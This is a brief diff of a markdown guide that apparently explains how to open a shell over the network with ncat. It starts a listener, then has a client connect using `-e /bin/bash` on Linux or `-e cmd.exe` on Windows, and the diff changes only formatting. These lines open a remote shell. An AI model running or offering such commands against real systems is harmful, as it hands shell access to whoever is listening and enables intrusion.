@@ -5,14 +5,16 @@
 
 
 ### 2) Set up a listening server:
-Run `ncat -lvnp <port>` on the server.
+Run `ncat -lvnp <port>`
 
 
 ### 3) Connect client to server:
 For Linux/Bash:
+
 Run `ncat <server-internal-ip> <port> -e /bin/bash`
 
 For Windows:
+
 Run `ncat <server-internal-ip> <port> -e cmd.exe`
 
 *To find the internal IP run `hostname I` on Linux OR `ipconfig` on Windows.*
